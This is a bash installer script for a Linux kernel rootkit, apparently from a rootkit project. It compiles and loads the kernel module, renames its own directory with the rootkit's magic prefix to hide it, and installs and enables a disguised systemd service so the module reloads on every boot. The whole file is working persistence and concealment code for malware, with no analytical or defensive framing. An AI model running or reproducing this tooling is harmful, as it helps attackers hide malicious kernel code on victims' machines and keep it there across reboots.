#!/bin/bash

make

koFile=$(ls *.ko)
hFile=$(ls *.h)
if test -f "$koFile"; then
    
    # Load the rootkit's kernel module:
    insmod "$koFile"

    # Hide current directory via MAGIC_PREFIX:
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thisDirPath=$(pwd)
    thisDir=${PWD##*/}
    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"

    # Load rootkit on boot:
    touch boot.sh
    chmod +x boot.sh
    echo "#!/bin/bash" >> boot.sh
    echo "insmod $koFile" >> boot.sh
    bootPath=$(pwd)"/boot.sh"
    loadServicePath="/etc/systemd/system/""$magicPrefix""load.service"
    touch $loadServicePath
    echo "[Unit]" >> "$loadServicePath"
    echo "Description=Joe Mamma" >> "$loadServicePath"
    echo "After=multi-user.target" >> "$loadServicePath"
    echo "" >> "$loadServicePath"
    echo "[Service]" >> "$loadServicePath"
    echo "Type=simple" >> "$loadServicePath"
    echo "RemainAfterExit=yes" >> "$loadServicePath"
    echo "ExecStart=$bootPath" >> "$loadServicePath"
    echo "TimeoutStartSec=0" >> "$loadServicePath"
    echo "" >> "$loadServicePath"
    echo "[Install]" >> "$loadServicePath"
    echo "WantedBy=default.target" >> "$loadServicePath" 
    systemctl daemon-reload
    systemctl enable "$loadServicePath"   

    # Others:

    echo "built."
fi